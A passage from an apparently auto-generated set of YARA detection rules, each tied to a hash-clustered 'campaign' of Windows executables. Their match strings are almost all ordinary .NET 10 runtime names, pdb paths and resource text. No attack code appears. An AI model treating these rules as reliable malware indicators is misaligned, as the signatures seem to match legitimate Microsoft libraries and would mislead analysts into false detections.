        $s10 = "FSystem.Net.WebSockets.ManagedWebSocket+<HandleReceivedCloseAsync>d__63" ascii
        $s11 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3ca2ff29_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3ca2ff29"
        date = "2026-10-31"
        campaign = "tlsh-3ca2ff29"
        family = ""
        hash = "a87455a818254627457395e85ab4970cc844edf07254456da624a37c99e9a23f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3ca2ff29.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.IO.FileSystem.AccessControl/Release/net10.0-windows/System.IO.Fi" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "#Access to the path '{0}' is denied.~" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "leSystem.AccessControl.pdb" ascii
        $s8 = "eKeys\" featurevalue=\"false\">" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "<>y__InlineArray2`1" ascii
        $s11 = "<>y__InlineArray3`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_04f499e8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-04f499e8"
        date = "2026-10-31"
        campaign = "tlsh-04f499e8"
        family = ""
        hash = "2311a3f92971de918943573dfb66e04e25c1d543663951eb24e8eb1a0dcd4251"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-04f499e8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "<GetWindowsAccountDomainSid>g____PInvoke|19_0" ascii
        $s3 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s4 = "<AllocateLocallyUniqueId>g____PInvoke|28_0" ascii
        $s5 = "/_/src/runtime/artifacts/obj/System.Security.Principal.Windows/Release/net10.0-windows/System.Securi" ascii
        $s6 = "<ImpersonateLoggedOnUser>g____PInvoke|25_0" ascii
        $s7 = "<CheckTokenMembership>g____PInvoke|29_0" ascii
        $s8 = "BWindows Principal functionality is not supported on this platform.{" ascii
        $s9 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s10 = "<CreateWellKnownSid>g____PInvoke|16_0" ascii
        $s11 = "<IsEqualDomainSid>g____PInvoke|21_0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c020f964_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c020f964"
        date = "2026-10-31"
        campaign = "tlsh-c020f964"
        family = ""
        hash = "bb98698413fd83ccf898fff8d7d5763380f176914657dbe5ab2338716e500ef5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c020f964.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "BSystem.Net.ServerSentEvents.SseParser`1+<FillLineBufferAsync>d__38" ascii
        $s3 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s4 = "?System.Net.ServerSentEvents.SseFormatter+<WriteAsyncCore>d__3`1" ascii
        $s5 = "=System.Net.ServerSentEvents.SseParser`1+<EnumerateAsync>d__23" ascii
        $s6 = "System.Collections.Generic.IAsyncEnumerator<System.Net.ServerSentEvents.SseItem<T>>.MoveNextAsync" ascii
        $s7 = "System.Collections.Generic.IAsyncEnumerable<System.Net.ServerSentEvents.SseItem<T>>.GetAsyncEnumerat" ascii
        $s8 = "System.Collections.Generic.IAsyncEnumerator<System.Net.ServerSentEvents.SseItem<T>>.get_Current" ascii
        $s9 = "    <resource name=\"FxResources.System.Net.ServerSentEvents.SR.resources\" action=\"remove\" />" ascii
        $s10 = "  <assembly fullname=\"System.Net.ServerSentEvents\" feature=\"System.Resources.UseSystemResourceKeys\" " ascii
        $s11 = "ThrowArgumentException_CannotContainLineBreaks" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3d24b71c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3d24b71c"
        date = "2026-10-31"
        campaign = "tlsh-3d24b71c"
        family = ""
        hash = "5758c463a2a0df0d10656eb61f1465bf4b14754e9c395112e47a2f0de75a0c4b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3d24b71c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<RegexGenerator_g>FCDFAA894408A4BE52DB36407A8838158E1347B18C8E6D1FBD1331CEC2A9DD6BE__Utilities" ascii
        $s1 = "<RegexGenerator_g>FCDFAA894408A4BE52DB36407A8838158E1347B18C8E6D1FBD1331CEC2A9DD6BE__CreateConnectio" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s4 = "System.Diagnostics.CodeAnalysis.RequiresDynamicCodeAttribute, System.Private.CoreLib, Version=10.0.0" ascii
        $s5 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s6 = "System.Diagnostics.CodeAnalysis.RequiresUnreferencedCodeAttribute, System.Private.CoreLib, Version=1" ascii
        $s7 = "System.ComponentModel.ExpandableObjectConverter, System.ComponentModel.TypeConverter, Version=10.0.0" ascii
        $s8 = "wDBNowDBNullNestedInnDataSetCaseSensensitiveRemotingngFormatDataTypeAttributttributeA" wide
        $s9 = "/_/src/runtime/artifacts/obj/System.Data.Common/Release/net10.0/System.Data.Common.pdb" ascii
        $s10 = "+Value '{1}' is invalid for attribute '{0}'.N" ascii
        $s11 = "ther occur in RequiresUnreferencedCode scopes, or have individually justified suppressions.!" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5542416 and 12 of them
}

rule Sightlines_tlsh_d1571ccf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-d1571ccf"
        date = "2026-10-31"
        campaign = "tlsh-d1571ccf"
        family = ""
        hash = "62064d17a313640f4dfb7b7f8116ccbb70b0b9f5b9643a821c99b6a544b8d8a3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-d1571ccf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/Microsoft.Win32.Registry/Release/net10.0-windows/Microsoft.Win32.Regist" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "!Cannot write to the registry key.`" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "InlineArrayAsReadOnlySpan" ascii
        $s8 = "<>y__InlineArray2`1" ascii
        $s9 = "IsAotCompatible" ascii
        $s10 = "l(f8VRb_VhPhZmL" ascii
        $s11 = "0,B@HLRQ4qHt6" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_40dee885_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-40dee885"
        date = "2026-10-31"
        campaign = "tlsh-40dee885"
        family = ""
        hash = "1bb8def6afbc0e53098c4d2583be77e6684e85cccafd8b397783db89767dc834"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-40dee885.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "}BinaryFormatter serialization and deserialization have been removed. See https://aka.ms/binaryforma" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "sourceKeys\" featurevalue=\"false\">" ascii
        $s6 = "Serialization.Formatters.pdb" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "get_BinaryFormatter_Removed" ascii
        $s9 = "InlineArrayAsReadOnlySpan" ascii
        $s10 = "tter for more information." ascii
        $s11 = "<>y__InlineArray2`1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f5677af3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f5677af3"
        date = "2026-10-31"
        campaign = "tlsh-f5677af3"
        family = ""
        hash = "61d1189f1f99d27ec4e68dd00075874e67580c57e0f4c3f04a77db926a0fef00"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f5677af3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "<RuntimeOps_CreateRuntimeVariables_ObjectArray_Int64Array>k__BackingField" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s3 = "<CreateObjectArrayDelegateRefEmit>g__ForceAllowDynamicCode|19_1" ascii
        $s4 = "<CreateObjectArrayDelegateRefEmit>g__CreateForceAllowDynamicCodeScope|19_0" ascii
        $s5 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s6 = "System.Diagnostics.CodeAnalysis.RequiresDynamicCodeAttribute, System.Runtime, Version=10.0.0.0, Cult" ascii
        $s7 = "<MethodInfo_CreateDelegate_Type_Object>k__BackingField" ascii
        $s8 = "2System.Linq.Expressions.CanEmitObjectArrayDelegate" ascii
        $s9 = "/_/src/runtime/artifacts/obj/System.Linq.Expressions/Release/net10.0/System.Linq.Expressions.pdb" ascii
        $s10 = "<Closure_ObjectArray_ObjectArray>k__BackingField" ascii
        $s11 = "<DictionaryOfStringInt32_Ctor_Int32>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7279136 and 12 of them
}

rule Sightlines_tlsh_7c9a5b32_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7c9a5b32"
        date = "2026-10-31"
        campaign = "tlsh-7c9a5b32"
        family = ""
        hash = "2d51acdec5b982fb3181f661642cf6d628b162dd12e93b32008a3a2469461347"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7c9a5b32.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ",+-+/.0.2143657598;:<:?>A@B@DCECJIRQSRTRUQVQWQXQYQZQ^]_]`]a]b]cbd]e]onpnqnrn" wide
        $s1 = "ESystem.IO.Compression.ZipArchiveEntry+<ThrowIfNotOpenableAsync>d__137" ascii
        $s2 = "PSystem.IO.Compression.Zip64EndOfCentralDirectoryLocator+<TryReadBlockAsync>d__10" ascii
        $s3 = "NSystem.IO.Compression.ZipArchive+<TryReadZip64EndOfCentralDirectoryAsync>d__80" ascii
        $s4 = "TSystem.IO.Compression.ZipArchiveEntry+<LoadLocalHeaderExtraFieldIfNeededAsync>d__134" ascii
        $s5 = "VSystem.IO.Compression.ZipArchiveEntry+<WriteLocalFileHeaderAndDataIfNeededAsync>d__142" ascii
        $s6 = "?System.IO.Compression.DeflateStream+<<FlushAsync>g__Core|37_0>d" ascii
        $s7 = "OSystem.IO.Compression.Zip64EndOfCentralDirectoryRecord+<TryReadBlockAsync>d__18" ascii
        $s8 = "DSystem.IO.Compression.ZipHelper+<SeekBackwardsToSignatureAsync>d__12" ascii
        $s9 = "PSystem.IO.Compression.ZipArchiveEntry+<WriteCrcAndSizesInLocalHeaderAsync>d__143" ascii
        $s10 = "GSystem.IO.Compression.ZipArchiveEntry+<WriteLocalFileHeaderAsync>d__141" ascii
        $s11 = "ISystem.IO.Compression.ZipEndOfCentralDirectoryBlock+<ReadBlockAsync>d__19" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_660555c0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-660555c0"
        date = "2026-10-31"
        campaign = "tlsh-660555c0"
        family = ""
        hash = "0a59a95787ee15784d73079fdd5dc555b78659a6c560b6cbbf0d7452e638df89"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-660555c0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "=System.IO.Compression.BrotliStream+<<ReadAsync>g__Core|26_0>d" ascii
        $s1 = "8System.IO.Compression.BrotliStream+<FlushAsyncCore>d__15" ascii
        $s2 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s4 = "6System.IO.Compression.BrotliStream+<DisposeAsync>d__40" ascii
        $s5 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s6 = ">System.IO.Compression.BrotliStream+<WriteAsyncMemoryCore>d__12" ascii
        $s7 = "/_/src/runtime/artifacts/obj/System.IO.Compression.Brotli/Release/net10.0-windows/System.IO.Compress" ascii
        $s8 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s9 = " Stream does not support writing.l" ascii
        $s10 = "BrotliEncoderMaxCompressedSize" ascii
        $s11 = ".NETCoreApp,Version=v10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c4f4be9c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c4f4be9c"
        date = "2026-10-31"
        campaign = "tlsh-c4f4be9c"
        family = ""
        hash = "5ba32bcde2d72362db2d6e02763ece79fa35bc878b50493e956ce594307e997f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c4f4be9c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "System.Security.Permissions.SecurityPermissionAttribute, System.Private.CoreLib, Version=10.0.0.0, C" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "#Failed to marshal Promise callback." ascii
        $s6 = "ResourceKeys\" featurevalue=\"false\">" ascii
        $s7 = "get_FailedToMarshalPromiseHolder" ascii
        $s8 = "e.InteropServices.JavaScript.pdb" ascii
        $s9 = ".NETCoreApp,Version=v10.0" ascii
        $s10 = "InlineArrayAsReadOnlySpan" ascii
        $s11 = "PromiseHolder is null." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_27a2b24d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-27a2b24d"
        date = "2026-10-31"
        campaign = "tlsh-27a2b24d"
        family = ""
        hash = "d2677e25b164af13d28032b03fd6eb30a4fcc3d9ced4771eaab11cd7d8721216"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-27a2b24d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s4 = "sourceKeys\" featurevalue=\"false\">" ascii
        $s5 = "Serialization.Primitives.pdb" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "IsAotCompatible" ascii
        $s8 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_db503e2e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-db503e2e"
        date = "2026-10-31"
        campaign = "tlsh-db503e2e"
        family = ""
        hash = "716f9417ef3b0b230b9dbe23e6b2b092b2fc1a19ea11c018b467e1f30f88b041"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-db503e2e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "=System.Net.Quic.QuicConnection+<OpenOutboundStreamAsync>d__50" ascii
        $s4 = "System.Diagnostics.Tracing.EventKeywords, System.Diagnostics.Tracing, Version=10.0.0.0, Culture=neut" ascii
        $s5 = ">System.Net.Quic.QuicConnection+<AcceptInboundStreamAsync>d__51" ascii
        $s6 = "?System.Net.Quic.QuicConnection+<OnStreamCapacityIncreased>d__33" ascii
        $s7 = "{0} Signaling StreamCapacityIncreased with {1} bidirectional increment (absolute value {2}) and {3} " wide
        $s8 = "ZSystem.Net.Quic.QuicConnection+SslConnectionOptions+<StartAsyncCertificateValidation>d__12" ascii
        $s9 = "/_/src/runtime/artifacts/obj/System.Net.Quic/Release/net10.0-windows/System.Net.Quic.pdb" ascii
        $s10 = ".System.Net.Quic.QuicStream+<DisposeAsync>d__45" ascii
        $s11 = "<GetExceptionForMsQuicStatus>g__GetExceptionInternal|4_0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_26ec6c05_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-26ec6c05"
        date = "2026-10-31"
        campaign = "tlsh-26ec6c05"
        family = ""
        hash = "66d618b5522b3e4f7a3c7f2bd872fc378fa6f9bbdca3636854eb1a8cb948e631"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-26ec6c05.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Threading.AccessControl/Release/net10.0-windows/System.Threading" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "ObjectIncompatibleWithCurrentUserOnly" ascii
        $s6 = "<CreateSemaphoreEx>g____PInvoke|35_0" ascii
        $s7 = "<CreateMutexEx>g____PInvoke|31_0" ascii
        $s8 = "<OpenSemaphore>g____PInvoke|34_0" ascii
        $s9 = "<OpenMutex>g____PInvoke|30_0" ascii
        $s10 = ".NETCoreApp,Version=v10.0" ascii
        $s11 = "InlineArrayAsReadOnlySpan" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_97ee17c8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-97ee17c8"
        date = "2026-10-31"
        campaign = "tlsh-97ee17c8"
        family = ""
        hash = "4f3f74d9fe5f61cf277a05f9294d7185a78771da186030f498e212785b631522"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-97ee17c8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%nKind=%1;%nClrInstanceID=%2;%nTypeID=%3;%nTypeName=%4;%nAddress=%5;%nObjectSize=%6;%nSampledByteOff" wide
        $s1 = "WaitSource=%1;%nAssociatedObjectID=%2;%nClrInstanceID=%3" wide
        $s2 = "NativePdbAge=%11;%nNativePdbBuildPath=%12;%nNativeBuildID=%13" wide
        $s3 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\coreclr\\windows.x64.Release\\dlls\\clretwrc\\clretwrc.pdb" ascii
        $s4 = "AllocationSamplingKeyword" wide
        $s5 = "ModuleLoadUnloadRundown_V3" wide
        $s6 = "WaitHandleWaitSourceMap" wide
        $s7 = "ModuleLoadUnload_V3" wide
        $s8 = "WaitHandleKeyword" wide
        $s9 = "WaitHandleWaitStop" wide
        $s10 = "AllocationSampled" wide
        $s11 = "SampledByteOffset" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1b4d8ca3_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1b4d8ca3"
        date = "2026-10-31"
        campaign = "tlsh-1b4d8ca3"
        family = ""
        hash = "650e48eb0c2c8f2e166bfb1af3ce563ba49424bce9c751c51bcf91d41fc67e64"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1b4d8ca3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s1 = "DebuggerDisableUserUnhandledExceptionsAttribute" ascii
        $s2 = "OverloadResolutionPriorityAttribute" ascii
        $s3 = "CompilerLoweringPreserveAttribute" ascii
        $s4 = "FeatureSwitchDefinitionAttribute" ascii
        $s5 = "IAlternateEqualityComparer`2" ascii
        $s6 = "UnsafeAccessorTypeAttribute" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "InvocationListEnumerator`1" ascii
        $s9 = "ParamCollectionAttribute" ascii
        $s10 = "ExtensionMarkerAttribute" ascii
        $s11 = "SwiftIndirectResult" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fa342abe_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fa342abe"
        date = "2026-10-31"
        campaign = "tlsh-fa342abe"
        family = ""
        hash = "10dae312a6697718f8ce3dfcdb17d6ae4b74687c765d74d50de8a8e69e08f5e7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fa342abe.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "0/7686@?LKXW^]_]`]dcedfcgfhcicjckclcmcnconpnqcrcsctcvuwuyxzx" wide
        $s1 = "<RegexGenerator_g>FAD5189FC365C646BC85F408728B63C8346E4C70E77F1DA0C508136C49906F750__ParameterReplac" ascii
        $s2 = "<RegexGenerator_g>FAD5189FC365C646BC85F408728B63C8346E4C70E77F1DA0C508136C49906F750__Utilities" ascii
        $s3 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s4 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s5 = "s_indexOfString_AC244FE541E52CFD90CCD7AB13997D32F9D5031F007841348B9EE5A65488D64E" ascii
        $s6 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s7 = "<GetStandardValues>g__GetTypeDescriptorReflectionType|15_0" ascii
        $s8 = "System.ComponentModel.BrowsableAttribute, System.ComponentModel.Primitives, Version=10.0.0.0, Cultur" ascii
        $s9 = "System.ComponentModel.ReadOnlyAttribute, System.ComponentModel.Primitives, Version=10.0.0.0, Culture" ascii
        $s10 = "System.Diagnostics.CodeAnalysis.RequiresUnreferencedCodeAttribute, System.Runtime, Version=10.0.0.0," ascii
        $s11 = "Justificationk_componentClass is already a protected through [DynamicallyAccessedModifiers(All)] or " ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1536624 and 12 of them
}

rule Sightlines_tlsh_c96b6873_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c96b6873"
        date = "2026-10-31"
        campaign = "tlsh-c96b6873"
        family = ""
        hash = "1bf165cee916a854e1150f489e4348ce94755359d5fcdcc0bc2bbbe6a7102bdd"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c96b6873.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Diagnostics.TextWriterTraceListener/Release/net10.0/System.Diagn" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "mResourceKeys\" featurevalue=\"false\">" ascii
        $s6 = "ostics.TextWriterTraceListener.pdb" ascii
        $s7 = ".NETCoreApp,Version=v10.0" ascii
        $s8 = "IsAotCompatible" ascii
        $s9 = "tE*E4EFELETg" ascii
        $s10 = "f*^5jA:H:P" ascii
        $s11 = ".NET 10.0" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_3c488ca4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3c488ca4"
        date = "2026-10-31"
        campaign = "tlsh-3c488ca4"
        family = ""
        hash = "06bb307343db955a312634d00ba5e097cf5168a901284437592c28d780804e33"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3c488ca4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Net.Ping/Release/net10.0-windows/System.Net.Ping.pdb" ascii
        $s4 = "-The system's ping utility could not be found.E" ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = ".NETCoreApp,Version=v10.0" ascii
        $s7 = "IsAotCompatible" ascii
        $s8 = ".NET 10.0" ascii
        $s9 = "%V-j?BFz" ascii
        $s10 = "N*J$~gFz" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_1f4f343d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1f4f343d"
        date = "2026-10-31"
        campaign = "tlsh-1f4f343d"
        family = ""
        hash = "486860152a651e5b8467477821e3534ebc5b2e3ea9d716c1d187e2ca914b1fcc"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1f4f343d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/System.Private.Uri/Release/net10.0/System.Private.Uri.pdb" ascii
        $s4 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s5 = "<StripBidiControlCharacters>b__27_0" ascii
        $s6 = "LastErrorOkayForRelativeUris" ascii
